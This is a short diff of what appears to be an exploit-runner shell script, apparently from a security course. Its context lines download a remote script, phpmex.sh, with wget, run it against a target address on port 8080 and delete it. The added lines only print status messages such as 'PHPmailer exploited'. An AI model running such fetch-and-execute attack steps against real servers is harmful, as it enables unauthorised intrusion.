@@ -54,4 +54,10 @@ wget https://raw.githubusercontent.com/mrg5103/ist242/master/phpmex.sh
 
 bash phpmex.sh $ipaddress:8080
 rm phpmex.sh
-
+echo -e "\e[32;1mPHPmailer exploited\e[0m"
+echo ""
+echo ""
+echo ""
+sleep 3
+echo -e "\e[32;1mExploits Finished.  Exiting...\e[0m"
+sleep 2
